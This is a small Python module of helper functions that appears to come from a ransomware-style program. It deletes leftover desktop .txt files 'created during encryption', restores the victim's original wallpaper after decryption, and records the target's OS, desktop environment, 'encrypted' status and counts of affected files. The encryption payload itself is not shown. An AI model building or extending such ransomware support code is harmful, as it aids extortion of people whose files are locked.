from os import remove, path
from glob import glob
from json import loads



# Remove every extra file that was created during encryption (on desktop)
def removeGlobFiles(desktop_path, filenames) -> None:
    for file in glob(f'{desktop_path}/{filenames}*.txt'):
        try: remove(file)
        except: continue



# If decrypted successfully, handle the JSON file
def handleAndRemoveJSONinfo(JSON_PATH, APP) -> bool | None:

    # Make sure the JSON file exists
    if not path.isfile(JSON_PATH): return None

    new_wallpaper = None

    # Parse the JSON file
    json_file = APP.readFile(JSON_PATH)
    to_dict = loads(json_file)

    if 'original_background' in to_dict:
        # Set the wallpaper variable
        new_wallpaper = to_dict["original_background"]

    # Remove the JSON file
    remove(JSON_PATH)

    return new_wallpaper



def saveInfoToJSON(target_os, target_de, dirs_num, files_num):
    asJSON = {}
    asJSON['os'] = target_os
    asJSON['de'] = target_de
    asJSON["status"] = 'encrypted'
    asJSON["directories"] = dirs_num
    asJSON["files_modified"] = files_num

    return asJSON